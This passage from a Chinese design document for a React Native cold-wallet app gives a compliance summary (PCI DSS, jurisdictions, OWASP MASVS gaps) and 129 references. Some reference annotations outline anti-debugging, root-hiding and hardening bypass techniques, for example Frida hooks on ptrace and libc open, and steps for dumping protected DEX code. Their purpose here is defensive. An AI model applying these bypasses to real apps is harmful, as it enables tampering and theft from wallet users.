目标的差距清单即上表「缺口与 roadmap」列的并集，且每一项都已在第 4/5/7 章的 roadmap 中有对应排期归属。

### 8.5 小结：合规边界一页结论

- **PCI DSS**：纯自托管冷钱包数据流中无 PAN/SAD → 不存在 CDE → PCI DSS v4.0.1 **out of scope**（非 exempt）。未来扩展卡业务时，PCI 义务由持牌 issuer-processor / on-ramp TPSP 承担，钱包方残留义务上限 SAQ A；架构红线为「钱包核心永不触碰卡数据」，隔离按 out-of-scope 五条判定 + 年度分段渗透测试维持。范围判定至少每 12 个月复核一次[^184^][^195^]。
- **辖区边界**：不面向中国大陆——不上架、不提供下载、geo-fence + 隐私政策披露（§6.6）；海外辖区按 VASP/MiCA/FinCEN 差异提示处理，非托管钱包在多数辖区不构成 VASP，**以上均不构成法律意见**，上线前由持牌律师按目标市场确认。
- **OWASP MASVS**：目标 **MAS-L2+R（+P）**（基于官方示例矩阵的推论，非官方逐字要求）；当前 L1 全达、L2 大部分达成；差距清单 = AUTH 生物特征变更密钥失效（已知缺口，roadmap 第一优先级）+ STORAGE 私有存储加密 + PLATFORM-3 三项 + CODE 强制更新/编译加固 + RESILIENCE 混淆与反注入。
- **诚实边界**：本章所有「达成」均指 3 天 demo 范围内的实现与验证（§7.3），对外表述用「已实现并验证」而非「已安全」「已合规」；OWASP 不提供 MASVS 认证，本自评不构成任何认证宣称[^199^]。

---

## 参考文献

[^1^]: Android Developer Verification — https://developer.android.com/developer-verification（2026-09-30 四国生效；官网直链首阶段豁免）（首发章节：第1章）
[^2^]: Expo SDK 57 Changelog — https://expo.dev/changelog/sdk-57（2026-06-30）（首发章节：第1章）
[^3^]: EAS Pricing — https://expo.dev/pricing（2026-10-14 一手核实）；另见：EAS Pricing（Free 15+15 builds/月、1K MAU）；另见：Expo Pricing（首发章节：第1章）
[^4^]: Expo 官方博客：Expo Router v56 — Decoupling from React Navigation（版本号与 SDK 对齐）— https://expo.dev/blog/expo-router-v56-decoupling-from-react-navigation（2026-05-28）（首发章节：第1章）
[^5^]: NativeWind v5 官方文档（"V4 remains the stable release"）— https://www.nativewind.dev/v5/getting-started/installation；另见：NativeWind v5 官方文档（5.0.0-rc.0；"V4 remains the stable release"）（首发章节：第1章）
[^6^]: npm registry 版本实测（viem 2.56.9 / ethers 6.17.0 等）— https://registry.npmjs.org（2026-10-14 实测）；另见：npm registry 版本实测（@tanstack/react-query 5.104.2 / zustand 5.0.15 / expo-router 57.0.26 / nativewind 4.2.7 / reanimated 4.7.1 / flash-list 2.3.3 等）（首发章节：第1章）
[^7^]: Android Keystore 支持曲线（仅 NIST P 系列，无 secp256k1）— https://source.android.com/docs/security/features/keystore（2026-10 核实）（首发章节：第1章）
[^8^]: Play Integrity API 官方文档 — https://developer.android.com/google/play/integrity（2026-10-14）（首发章节：第1章）
[^9^]: mercuretechnologies/xprem（原 expo-open-ota，签名不受 EAS 档位限制）— https://github.com/mercuretechnologies/xprem（2026-10-14 GitHub API 核实：673★）；另见：mercuretechnologies/xprem（原 expo-open-ota）（首发章节：第1章）
[^10^]: SymbioticSec, "We Built a Decompiler for React Native Apps"（hermes-decomp 支持 Hermes 字节码 v40–v99、MCP server 形态）— https://www.symbioticsec.ai/blog/we-built-a-decompiler-for-react-native-apps-heres-how-we-tested-it-at-insomnihack（2026-04）；另见：SymbioticSec, "We Built a Decompiler for React Native Apps"（hermes-decomp 支持 v40–v99、结构化 JS 输出、MCP server）；另见：SymbioticSec — We built a decompiler for React Native apps（hermes-decomp 支持 Hermes bytecode v40–v99、结构化 JS 输出、附带 MCP server）（首发章节：第1章）
[^11^]: OWASP MASVS Resilience（MASVS-R）— https://mas.owasp.org/MASVS/（2026-10-14）（首发章节：第1章）
[^12^]: Expo SDK 版本列表 — https://expo.dev/sdk（2026-10-14 页面快照）（首发章节：第2章）
[^13^]: Expo SDK 56 Changelog（Hermes v1 默认、bytecode diffing 默认开、Expo Go 不上架商店） — https://expo.dev/changelog/sdk-56（2026-05-21）；另见：Expo SDK 56 Changelog（首发章节：第2章）
[^14^]: Expo Changelog 索引（"Update to 57.0.21 or later on SDK 57"） — https://expo.dev/changelog（2026-09-15 条目）（首发章节：第2章）
[^15^]: Expo SDK 58 Beta Changelog — https://expo.dev/changelog/sdk-58-beta（2026-09-15）（首发章节：第2章）
[^16^]: Why Expo is a great fit for new and existing React Native apps（"managed vs bare" 概念过时） — https://expo.dev/blog/why-expo-is-a-great-fit-for-new-and-existing-react-native-apps（2026-09-11）（首发章节：第2章）
[^17^]: What is Continuous Native Generation — https://expo.dev/blog/what-is-continuous-native-generation（2024-07-30）（首发章节：第2章）
[^18^]: Expo vs Bare React Native 2026 社区对比 — https://muhittincamdali.com/en/comparisons/expo-vs-bare-react-native/（2026-09-06）（首发章节：第2章）
[^19^]: EAS Update Code Signing（仅 Production/Enterprise 档） — https://docs.expo.dev/eas-update/code-signing/（2026-07-21）；另见：Code signing — Expo Docs；另见：Expo 官方文档 — EAS Update Code Signing（rsa-v1_5-sha256；私钥本地签名不出机；验签失败拒绝加载；仅 Production/Enterprise 档可用）；另见：nexvault-rn_dim11.md §0/§2/§6/§7（EAS 代码签名仅 Production/Enterprise 档；codesigning:generate 流程；fingerprint runtimeVersion；bytecode diffing；xprem 自建签名不受档位限制） + Expo 官方文档 EAS Update Code Signing；内部文档：/mnt/agents/output/research/nexvault-rn_dim11.md（§0/§2/§6/§7）（首发章节：第2章）
[^20^]: Expo Go vs Development Builds — https://expo.dev/blog/expo-go-vs-development-builds（2024-09-12）（首发章节：第2章）
[^21^]: Expo SecureStore 官方文档（Keystore/Keychain 封装、2048B 上限、Web 不支持） — https://docs.expo.dev/versions/latest/sdk/securestore/（首发章节：第2章）
[^22^]: Stack Overflow：Expo SecureStore limitations（KV 边界、超出需自写模块） — https://stackoverflow.com/questions/72123843/expo-securestore-limitations（首发章节：第2章）
[^23^]: Expo 官方文档：Add custom native code / Local Expo Modules — https://docs.expo.dev/workflow/customizing/；另见：Expo 官方文档 Local Modules 与 C++ 模块建议走 Turbo Modules；https://docs.expo.dev/modules/overview（首发章节：第2章）
[^24^]: Expo SDK 55 Changelog（ArrayBuffer、StaticFunction、Swift 6 mode） — https://expo.dev/changelog/sdk-55（2026-02-25）（首发章节：第2章）
[^25^]: Nitro Modules 官方文档 — https://nitro.margelo.com/docs/getting-started/what-is-nitro（首发章节：第2章）
[^26^]: React Native 官方文档：Pure C++ TurboModules — https://reactnative.dev/docs/the-new-architecture/pure-cxx-modules（首发章节：第2章）
[^27^]: Expo ScreenCapture 官方文档（Android FLAG_SECURE） — https://docs.expo.dev/versions/latest/sdk/screen-capture/；另见：Expo 官方文档 — ScreenCapture（Android FLAG_SECURE、iOS app switcher 毛玻璃、截屏检测回调）（首发章节：第2章）
[^28^]: GitHub expo/expo#48985（iOS 重复 prevent 黑屏） — https://github.com/expo/expo/issues/48985（2026-08-16）（首发章节：第2章）
[^29^]: Expo Config Plugins 官方文档 — https://docs.expo.dev/config-plugins/plugins/（首发章节：第2章）
[^30^]: react-native-device-info README（getFingerprint = Build.FINGERPRINT，无签名证书 API） — https://github.com/react-native-device-info/react-native-device-info（首发章节：第2章）
[^31^]: Expo App Integrity 官方文档（alpha、Secure Enclave 仅存 App Attest 私钥） — https://docs.expo.dev/versions/latest/sdk/app-integrity/；另见：Expo 官方文档 @expo/app-integrity（alpha）；GitHub bluesky-social/react-native-device-attest；npm @pagopa/io-react-native-integrity；Snyk react-native-google-play-integrity（INACTIVE）；https://github.com/bluesky-social/react-native-device-attest；https://www.npmjs.com/package/@pagopa/io-react-native-integrity；https://security.snyk.io/package/npm/react-native-google-play-integrity（首发章节：第2章）
[^32^]: react-native-secure-sign（Secure Enclave/硬件 Keystore 社区库） — https://github.com/react-native-secure-sign/react-native-secure-sign（首发章节：第2章）
[^33^]: TanStack Query 官方安装文档（兼容 React Native） — https://tanstack.com/query/latest/docs/framework/react/installation（首发章节：第2章）
[^34^]: Snyk 漏洞库：zustand 无已知直接漏洞 — https://security.snyk.io/package/npm/zustand/4.5.5（首发章节：第2章）
[^35^]: TanStack Router 官方安装文档（仅兼容 ReactDOM/Solid，RN 适配器不存在） — https://tanstack.com/router/latest/docs/framework/react/installation（2026-10-14 直读）（首发章节：第2章）
[^36^]: Tamagui GitHub commits（v3.0.9，当日仍提交） — https://github.com/tamagui/tamagui/commits/main（2026-10-14）（首发章节：第2章）
[^37^]: gluestack-ui v5 Stable Release 官方博客（废弃 Next.js/Web 适配） — https://gluestack.io/blogs/gluestack-ui-v5-stable-release（2026-06-25）（首发章节：第2章）
[^38^]: CVE-2026-97724（react-native-worklets <0.12.2 原型链污染→远程 DoS） — https://www.rapid7.com/db/vulnerabilities/cve-2026-97724/（2026-09-25）（首发章节：第2章）
[^39^]: CVE-2026-15702（Tamagui ≤2.3.0 原型链污染，2.3.1 修复） — https://app.opencve.io/cve/CVE-2026-15702（2026-07-14）（首发章节：第2章）
[^40^]: gluestack / @react-native-aria 供应链 RAT 事件汇编（引 Aikido/SecurityWeek/BleepingComputer/Snyk） — https://pranava0x0.github.io/vibe-coding-security/advisories/2026-06-gluestack-react-native-aria-rat.html（2026-06-06）（首发章节：第2章）
[^41^]: AniUI Expo SDK 56 文档（Reanimated/worklets 钉子版本） — https://www.aniui.dev/docs/expo-56（2026-05-21）（首发章节：第2章）
[^42^]: Shopify FlashList 官方文档：v2 Changes（免 estimatedItemSize、新架构重写） — https://shopify.github.io/flash-list/docs/v2-changes/（2026-10-01）（首发章节：第2章）
[^43^]: Expo 官方 Monorepo 指南（SDK 52+ 自动 Metro 配置、SDK 54+ pnpm 隔离安装） — https://docs.expo.dev/guides/monorepos/（2026-09-25 更新）（首发章节：第2章）
[^44^]: Expo SDK 55 pnpm monorepo 实战（autolinking 误扫需双层屏蔽） — https://zenn.dev/yudai_uk/articles/expo-sdk-55-upgrade-pitfalls-monorepo（2026-03-04）（首发章节：第2章）
[^45^]: viem vs ethers 体积/下载量/commits 数据 — https://www.pkgpulse.com/guides/wagmi-vs-ethersjs-vs-viem-web3-javascript-libraries-2026（2026-03-09）；https://javascripts.com/packages/viem/ 与 /packages/ethers/（2026-09-25 快照）（首发章节：第2章）
[^46^]: viem 官方文档：Platform Compatibility（polyfill 清单、全现代浏览器支持） — https://viem.sh/docs/compatibility（2026-10-12 抓取）（首发章节：第2章）
[^47^]: Callstack 博客：Build Modern Web3 dApps with React Native and Viem — https://www.callstack.com/blog/build-modern-web3-dapps-on-ethereum-with-react-native-and-viem（2026-06-08 抓取）（首发章节：第2章）
[^48^]: GitHub ethers-io/ethers.js#3996（RN 缺 node core 模块，长期未关） — https://github.com/ethers-io/ethers.js/issues/3996（2023-04-24 起）（首发章节：第2章）
[^49^]: ethers v6 官方 React Native Cookbook（quick-crypto register 模式） — https://docs.ethers.org/v6/cookbook/react-native/（首发章节：第2章）
[^50^]: viem 官方文档：Serializers（transaction(transaction, signature?)） — https://viem.sh/docs/chains/serializers（首发章节：第2章）
[^51^]: GitHub wevm/viem Discussion #785（sendRawTransaction 应外部签名需求加入） — https://github.com/wevm/viem/discussions/785（2024-05-31）（首发章节：第2章）
[^52^]: react-native-get-random-values GitHub Releases（2.0.0 新架构-only，最低 RN 0.81） — https://github.com/LinusU/react-native-get-random-values/releases（2025-10-22）（首发章节：第2章）
[^53^]: Paul Miller：noble 密码学库审计与生态（4 次第三方审计、周下载 2400 万） — https://paulmillr.com/noble/（2026-08）（首发章节：第2章）
[^54^]: ChainSafe 官方博客：web3.js Sunset（2025-03-04 归档，最终版 4.16.0） — https://blog.chainsafe.io/web3-js-sunset/（2025-01-15）（首发章节：第2章）
[^55^]: GitHub Advisory Database：ethers-io 仿冒包等 — https://github.com/advisories/GHSA-rmhg-qfp9-hvvm（2026-07-27）；另见 GHSA-h5cf-hh6x-vm87（2025-11-24）（首发章节：第2章）
[^56^]: AOSP frameworks/base 源码 diff（SUPPORTED_EC_NIST_CURVE_NAMES 白名单，实测报错打印） — https://android.googlesource.com/platform/frameworks/base/+/f22030d1c59aca4f9ad2af7d4c4d646b0b619f27%5E2..f22030d1c59aca4f9ad2af7d4c4d646b0b619f27/ （2023-11）（首发章节：第3章）
[^57^]: Android 官方文档 Keystore features（ECDSA NIST P-224/256/384/521） — https://source.android.com/docs/security/features/keystore/features （2026-10 抓取）（首发章节：第3章）
[^58^]: shattered.io, secp256k1 vs P-256 2026 对比（StrongBox/Keystore 不支持 k1） — https://shattered.io/secp256k1-vs-p-256-2026/ （2026-09-12）（首发章节：第3章）
[^59^]: Pocket Node Guide（AES-256-GCM + Keystore + 签名调用期驻留） — https://pocket-node.com/guide （2026-05）（首发章节：第3章）
[^60^]: cryptorecovery.io, MetaMask 钱包取证分析（SecureKeychain/Keystore 门控口令） — https://cryptorecovery.io/it/how-to-recover-metamask-wallet/ （2026-04）（首发章节：第3章）
[^61^]: openapps.pro, react-native-keychain 被 Rainbow/MetaMask/BlueWallet 采用 — https://openapps.pro/packages/react-native-keychain （2026）（首发章节：第3章）
[^62^]: Blessing et al., "A Large-Scale Analysis of Secure Key Storage in Android Apps", PoPETS 2026 — https://arxiv.org/html/2507.07927v1 （2025-07）（首发章节：第3章）
[^63^]: Android 15 CDD §9.11（硬件 Keystore MUST、StrongBox STRONGLY RECOMMENDED） — https://source.android.com/docs/compatibility/15/android-15-cdd （2026-07-31 抓取）（首发章节：第3章）
[^64^]: CertiK, "Web3 Mobile Wallet Apps: A Secret Key Protection Perspective" — https://www.certik.com/blog/web3-mobile-wallet-apps-a-secret-key-protection-perspective （2023-01-19）（首发章节：第3章）
[^65^]: Android API Reference, KeyGenParameterSpec.Builder（setUnlockedDeviceRequired 官方警告：API 31–34 已知 bug） — https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder （2025-02-10 抓取）（首发章节：第3章）
[^66^]: Critical Security, "How to correctly protect fintech apps for Android with biometric authentication" — https://www.critical.lt/blog/how-to-correctly-protect-fintech-apps-for-android-with-biometric-authentication/ （2026 抓取）（首发章节：第3章）
[^67^]: Information Security Stack Exchange, Keystore user-auth key 提取防护讨论 — https://security.stackexchange.com/questions/281677/ （2025-07）（首发章节：第3章）
[^68^]: Samsung Developers, Samsung Blockchain Keystore（TEE 内 secp256k1） — https://developer.samsung.com/blockchain/keystore/understanding-keystore/what-makes-keystore-unique.html （2026 抓取）（首发章节：第3章）
[^69^]: npm registry / GitHub API 实测 react-native-keychain 10.0.0（2025-03-23）与提交停滞；Snyk expo-secure-store 健康度 — https://registry.npmjs.org/react-native-keychain ; https://security.snyk.io/package/npm/expo-secure-store （2026-10-14 实测）（首发章节：第3章）
[^70^]: Apple Developer, "Protecting keys with the Secure Enclave"（SE 仅 256-bit EC、密钥不可导入、官方 keygen+ACL 样例） — https://developer.apple.com/documentation/security/protecting-keys-with-the-secure-enclave （现行）（首发章节：第3章）
[^71^]: SimpaLabs, iOS Keychain 渗透测试（越狱 dump 与生物识别 ACL 缓解） — https://simpalabs.com/blog/ios-swift-penetration-testing-keychain-bypass （2026-07）（首发章节：第3章）
[^72^]: npm/GitHub 实测 react-native-device-binding、expo-hardware-key 等 0 dependents — https://www.npmjs.com/package/react-native-device-binding （2026-10 实测）（首发章节：第3章）
[^73^]: The Hacker News, "20 Popular npm Packages With 2 Billion Downloads Compromised" — https://thehackernews.com/2025/09/20-popular-npm-packages-with-2-billion.html （2025-09）；另见：The Hacker News — 20 Popular npm Packages With 2 Billion Weekly Downloads Compromised（chalk/debug 投毒，payload 钩子 fetch/XHR/window.ethereum 重写钱包地址）（首发章节：第3章）
[^74^]: BlockEden, Shai-Hulud npm 蠕虫事件分析 — https://blockeden.xyz/blog/2026/01/18/shai-hulud （2026-01）（首发章节：第3章）
[^75^]: BleepingComputer / ELLIPAL, Trust Wallet Chrome 扩展 v2.68 供应链投毒 — https://www.bleepingcomputer.com/news/security/ （2026-01）（首发章节：第3章）
[^76^]: BrowserInsight, "Device Attestation Explained"（WEI 已撤回）；MojoAuth, WebAuthn attestation none 默认 — https://browserinsight.net/blog/device-attestation-explained ; https://mojoauth.com/blog/webauthn-attestation-why-none-is-the-right-default （2026-07）（首发章节：第3章）
[^77^]: Reown 官方文档 AppKit React Native / WalletKit — https://docs.reown.com/appkit/react-native/core/installation （2026-10-07 抓取）（首发章节：第3章）
[^78^]: Corbado, Passkeys PRF/WebAuthn 支持矩阵与 WebKit bug 311099/314934 — https://www.corbado.com/blog/passkeys-prf-webauthn （2025-04 起持续更新）（首发章节：第3章）
[^79^]: expo-modules-core CHANGELOG（ArrayBuffer 支持）；bugspulse RN 新架构指南（JSI 裸指针同步拷贝） — https://github.com/expo/expo/blob/main/packages/expo-modules-core/CHANGELOG.md ; https://bugspulse.com/blog/react-native-new-architecture-crash-debugging-guide-2026 （2026-10-14 / 2026-07-03）（首发章节：第3章）
[^80^]: bitcoindev 邮件列表 libsecp256k1 v0.7.0 官宣；openSUSE RPM 元数据（MIT、~1.3MB）；官方 README NDK CMake 命令 — https://mirror.b10c.me/lists/bitcoindev/ ; https://raw.githubusercontent.com/bitcoin/secp256k1/master/README.md （2025-07-22 / 2024-11+）（首发章节：第3章）
[^81^]: cvefeed/NVD, CVE-2025-66692（wallet-core <4.4.0）；trustwallet/wallet-core GitHub Releases 4.8.4；alexmonkeype/react-native-trust-wallet-core — https://cvefeed.io/vuln/detail/CVE-2025-66692 ; https://github.com/trustwallet/wallet-core/releases （2026-01-20 / 2026-10-14 读取）（首发章节：第3章）
[^82^]: paulmillr/noble-hashes README（JS 无法常数时间、无法可靠清零） — https://github.com/paulmillr/noble-hashes （2026-08-27）（首发章节：第3章）
[^83^]: developer.android.com, Play Integrity Standard/Classic 请求模式 — https://developer.android.com/google/play/integrity/standard （2025-11-11 抓取）（首发章节：第3章）
[^84^]: Android Developers Blog, "Making Play Integrity API faster, more resilient, and more private"（STRONG 12 个月补丁要求） — https://android-developers.googleblog.com/2024/12/making-play-integrity-api-faster-resilient-private.html （2024-12-03）（首发章节：第3章）
[^85^]: developer.android.com, Play Integrity Classic 页（nonce 入 token、JWE/JWS 结构、decodeIntegrityToken） — https://developer.android.com/google/play/integrity/classic （2025-01-14 抓取）（首发章节：第3章）
[^86^]: Apple Developer, "Establishing Your App's Integrity"（App Attest）；WWDC26 Session 201（优雅降级建议） — https://developer.apple.com/documentation/devicecheck/establishing-your-app-s-integrity ; https://developer.apple.com/videos/play/wwdc2026/201/ （现行 / 2026-10-10）；另见：Apple Developer, Establishing Your App's Integrity（App Attest 硬件 key、私钥不可读）；另见：Apple Developer — Establishing your app's integrity（App Attest：challenge→generateKey→attestKey→assertion；服务端验证）；另见：Apple Developer — WWDC26 Session 201: Secure your apps with App Attest（degrade gracefully on rejection；receipt-based fraud metric）（首发章节：第3章）
[^87^]: OWASP MASVS（MSTG-RESILIENCE-1 原文 "either by alerting the user or terminating the app"，MobSF/owasp-mstg 存档） — https://github.com/MobSF/owasp-mstg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md （MASVS 2.1.0）；另见：OWASP MASVS / MASVS-RESILIENCE-1（"either by alerting the user or terminating the app"，MobSF/owasp-mstg 存档）（首发章节：第3章）
[^88^]: OneSpan, "Root and Jailbreak Detection in Mobile Banking Security"（反对二元封禁、功能分级）；Verihubs, "Rooted Device Risk"（黄灯/红灯组合信号） — https://www.onespan.com/blog/root-and-jailbreak-detection-in-mobile-banking-security ; https://verihubs.com/en/blog/rooted-device-risk （2026-05-15 / 2026-10-07）；另见：OneSpan — Root and Jailbreak Detection in Mobile Banking Security（反对二元封禁；功能分级限制；root 检测是众多风险信号之一）（首发章节：第3章）
[^89^]: scottyab/rootbeer GitHub Releases（0.1.1 Android 15/16KB、0.1.2 2024-09-18；README 承认 root 检测不可能 100%） — https://github.com/scottyab/rootbeer/releases （2024-09）；另见：RootBeer GitHub（官方自述 "no root detection code can ever be 100% effective"；0.1.2 于 2024-09 发布）（首发章节：第4章）
[^90^]: P1sec/hermes-dec README（RN 应用 Hermes 字节码位于 assets/index.android.bundle） — https://github.com/P1sec/hermes-dec （2026-10 抓取）（首发章节：第4章）
[^91^]: HackTricks, React Native Application pentesting（hbctool 改条件跳转重打包流程） — https://hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/react-native-application.html （2026-10 抓取）（首发章节：第4章）
[^92^]: 看雪论坛 thread-278982（APK signing block 自解析完整 C 实现，含 raw syscall 变体） — https://bbs.kanxue.com/thread-278982.htm （2023-09）（首发章节：第4章）
[^93^]: Talsec, ApkSignatureKiller — how it works（EOCD 反扫、"APK Sig Block 42"、v2=0x7109871a、v3=0xf05368c0） — https://docs.talsec.app/appsec-articles/articles/apksignaturekiller-how-it-works-and-how-talsec-protects-your-apps （2025-08）（首发章节：第4章）
[^94^]: 微信公众号《安卓环境检测篇 1：应用签名检测》（fstat inode 与 /proc/self/maps 交叉校验） — https://mp.weixin.qq.com/s?__biz=Mzg4OTgxOTI3Mg==&mid=2247484771 （2025/2026）（首发章节：第4章）
[^95^]: cn-sec《Frida 学习笔记（二十五）》（小红书 libsentry.so 直接读 signing block，0xF05368C0） — https://cn-sec.com/archives/5331988.html （2026-07）（首发章节：第4章）
[^96^]: Guardsquare Blog, Phishing attacks on mobile banking apps（hook libc open 重定向 RASP 文件读取） — https://www.guardsquare.com/blog/phishing-attacks-mobile-banking-apps （2025-06）；另见：Guardsquare Blog — Phishing attacks on mobile banking apps（hook libc open 重定向 RASP 文件读取到原包的标准绕过）（首发章节：第4章）
[^97^]: OneUptime, React Native 加固实践（EXPECTED_BUNDLE_HASH 构建期嵌入、fail-secure） — https://oneuptime.com/blog/post/2026-01-15-react-native-prevent-reverse-engineering/view （2026-01）（首发章节：第4章）
[^98^]: arnavsinghinfosec, Detecting Shamiko/Zygisk Root Hiding on Android 2025（经典向量失效矩阵、mount namespace 失配仍有效） — https://medium.com/@arnavsinghinfosec/detecting-shamiko-zygisk-root-hiding-on-android-2025-the-definitive-developer-guide-71beac4a378d （2025-11）（首发章节：第4章）
[^99^]: 看雪论坛 thread-291930（Hunter 类检测器 18 项 marker；APatch /debug_ramdisk tmpfs 命中特征） — https://bbs.kanxue.com/thread-291930.htm （2026-07）（首发章节：第4章）
[^100^]: TMLP-Team, Detectors and Bypassers 编年（2026Q1 栈：SukiSU-Ultra+Zygisk Next≥1.3.0+PIF+TEESimulator 等） — https://github.com/TMLP-Team/TMLP-Detectors-and-Bypassers/blob/main/Bypassers/README.md （2026）（首发章节：第4章）
[^101^]: Doverunner, Shamiko Root Hide Detection（隐藏行为本身制造新的可检测痕迹） — https://doverunner.com/blogs/shamiko-root-hide-detection-for-android-apps/ （2025-11）（首发章节：第4章）
[^102^]: The Apple Wiki, Updating extensions for iOS 15/16（rootless 越狱 /var/jb 前缀、iphoneos-arm64） — https://theapplewiki.com/wiki/Dev:Updating_extensions_for_iOS_15/16 （2024-07）（首发章节：第4章）
[^103^]: securing/IOSSecuritySuite GitHub（README TODO 含 "Dopamine hidejb detector"；dyld 可疑库清单） — https://github.com/securing/IOSSecuritySuite （2026-10 抓取）（首发章节：第4章）
[^104^]: Digital.ai, Dopamine & Dopamine-RootHide: The Myth of the Undetectable Jailbreak（Hide Jailbreak=按需不注入+卸载 /var/jb，成熟检测库全报未越狱） — https://digital.ai/catalyst-blog/dopamine-dopamine-roothide-the-myth-of-the-undetectable-jailbreak/ （2025-11）；另见：Digital.ai — Dopamine & Dopamine-RootHide: The Myth of the Undetectable Jailbreak（Hide Jailbreak = 按需不注入 + 卸载 /var/jb，成熟检测库报「未越狱」）（首发章节：第4章）
[^105^]: AppKnox, IOSSecuritySuite jailbreak bypass（单条 Frida Interceptor 改写返回值） — https://www.appknox.com/blog/ios-security-suite-jailbreak-bypass （2025-09）（首发章节：第4章）
[^106^]: HackMag, iOS Anti-Reverse Engineering（PT_DENY_ATTACH 非文档化、dlsym 动态解析降审核可见度、二进制 patch 绕过） — https://hackmag.com/coding/ios-anti-reverse （2026-06）（首发章节：第4章）
[^107^]: Stack Overflow #76254673（Frida hook ptrace 恒返回 0 绕过反调试） — https://stackoverflow.com/questions/76254673/ （2023-05）（首发章节：第4章）
[^108^]: kiwisec, 加固被绕过的真实案例分析（梆梆企业版 2025-08 被完整绕过：Stalker 定位→伪造 TracerPid→hook kill→dump DEX） — https://www.kiwisec.com/xinwenzixun/ （2026-05）；另见：kiwisec, 2026 年主流安卓加固服务商技术能力横评（梆梆冷启动 +800~1500ms、低端机 ANR 4.7%+；娜迦声量下降）（首发章节：第4章）
[^109^]: n00b Bl0g, Advanced Frida Detection Bypass（brida 重编译改名：frida-agent→brida-bgent、re.frida.server→re.brida.server） — https://ymuu.me/posts/advanced-frida-detection-bypass/ （2025-11）（首发章节：第4章）
[^110^]: AppsOnAir, Runtime App Protection for Mobile Apps（ARM64 被 hook 序言以 B 指令 0x14xxxxxx 开头，为一阶可靠信号） — https://www.appsonair.com/blogs/runtime-app-protection-for-mobile-apps （2025/2026）（首发章节：第4章）
[^111^]: MASTG-KNOW-0003, App Signing（v3 lineage 必须纳入证书 pin，否则合法轮换误杀） — https://gulertech.co.uk/mobile/mastg-know-0003-app-signing/ （2026-09）（首发章节：第4章）
[^112^]: Stack Overflow #62622470（原版 obfuscator-llvm 停于 LLVM 4.0、与 NDK r21+ 不兼容） — https://stackoverflow.com/questions/62622470/ （2020）（首发章节：第4章）
[^113^]: open-obfuscator/o-mvll GitHub（活跃维护，支持 Android NDK 与 iOS toolchain，控制流平坦化/字符串加密/opaque constants；对 o-mvll 已有 deflat/angr 对抗研究） — https://github.com/open-obfuscator/o-mvll （2026-10 抓取）（首发章节：第4章）
[^114^]: Vendr Buyer Guide, GuardSquare NV（成交均值 ~$44k/年、峰值 ~$83k，第三方估算非官价） — https://www.vendr.com/buyer-guides/guardsquare-nv （2025）（首发章节：第4章）
[^115^]: rfp.wiki, Promon SHIELD vs DexGuard 对比（post-compile、模块化加价；DexGuard from $5k/年、iXGuard from $10k/年代理商口径） — https://www.rfp.wiki/it-security/in-app-protection/promon-shield-for-mobile/dexguard （2026-08）（首发章节：第4章）
[^116^]: dev.to, XopProtector vs DexGuard 全开源源对比（PDX1 DEX 加密 + PVM2 VMP + SO 自保护） — https://dev.to/_02872163a196e011/a-new-open-source-choice-for-android-app-protection-full-comparison-of-xopprotector-vs-dexguard-52pm （2026-09）（首发章节：第4章）
[^117^]: The Hacker News, Google Sets Sept 30 Deadline for Developer Verification（四国 + 7 家 participating stores 生效） — https://thehackernews.com/2026/06/google-sets-sept-30-deadline-for.html （2026-06）（首发章节：第4章）
[^118^]: Android Authority, How to bypass Android Developer Verification（官网直链与非参与商店首阶段豁免，经 Google 社区经理澄清） — https://www.androidauthority.com/how-to-bypass-android-developer-verification-sideloading-rules-3718002/ （2026-10-02）；另见：Android Developer Verification — Android Authority / foresightmobile；另见：Android Authority — How to bypass Android Developer Verification sideloading rules（2026-09-30 四国 + 7 家参与商店生效；官网直链首阶段豁免；2027 全球扩展覆盖所有安装路径）；https://foresightmobile.com/blog/android-developer-verification-2026（首发章节：第4章）
[^119^]: AAPS 文档, Android Developer Verification（2027 全球扩展覆盖所有安装路径含 APK；advanced flow 24 小时等待） — https://androidaps.readthedocs.io/en/latest/SettingUpAaps/AndroidDeveloperVerification.html （2026-08-21）（首发章节：第4章）
[^120^]: getupdraft 文档, Android Developer Verification（Android Developer Console 注册包名 + 提交 SHA-256 + challenge APK） — https://docs.getupdraft.com/android/android-developer-verification （2026-04）（首发章节：第4章）
[^121^]: sasandasaumya, Android Developer Verification with Expo step-by-step（同密钥测试 APK 即可，非生产包；注册后同密钥免重复证明） — https://sasandasaumya.medium.com/android-developer-verification-with-google-play-console-using-react-native-expo-step-by-step-64bbdeec7d63 （2026-05-15）（首发章节：第4章）
[^122^]: freedomtech, Google Taking Control of Android Phone Apps（身份归因非内容审核；提交私钥签名 APK 证明包名所有权；Full $25/Limited 免费 20 设备） — https://freedomtech.com.au/google-taking-control-android-phone-apps-2026/ （2026-06）（首发章节：第4章）
[^123^]: bamlab/react-native-app-security README（1.0.0，Expo development build + config plugin；TrustKit on iOS / OkHttp on Android） — https://github.com/bamlab/react-native-app-security （2026-04-16）（首发章节：第4章）
[^124^]: GitHub API, bamlab/react-native-app-security（225★、9 open issues、archived=false） — https://api.github.com/repos/bamlab/react-native-app-security （2026-10-14 查询）（首发章节：第4章）
[^125^]: BAM 源码 HttpClientOverride.kt（自定义 OkHttpClientFactory + CertificatePinner 装入 RN provider） — https://github.com/bamlab/react-native-app-security/blob/main/android/src/main/java/tech/bam/rnas/HttpClientOverride.kt （2026-04）（首发章节：第4章）
[^126^]: GitHub API, datatheorem/TrustKit 与 TrustKit-Android（均未归档；3.0.7 / 1.1.5 迁移 Maven Central） — https://api.github.com/repos/datatheorem/TrustKit ; https://api.github.com/repos/datatheorem/TrustKit-Android （2026-10-14 查询）（首发章节：第4章）
[^127^]: OWASP MASTG, Testing Network Communication（只 pin 开发者控制的 endpoint、必须 backup pin 与更新策略） — https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/ （2026-10 访问）（首发章节：第4章）
[^128^]: OWASP Pinning Cheat Sheet（SPKI/backup pin、禁 root CA pin、禁用户 click-through、构建期预置优于远程下发） — https://cheatsheetseries.owasp.org/cheatsheets/Pinning_Cheat_Sheet.html （2026-10 访问）；另见：OWASP Pinning Cheat Sheet（SPKI pin + 备用 pin；不 pin 根 CA；预置优于远程下发）（首发章节：第4章）
[^129^]: Square OkHttp 文档, TLS（CertificatePinner sha256 pin 用法） — https://square.github.io/okhttp/features/tls/ （2026-10 访问）（首发章节：第4章）
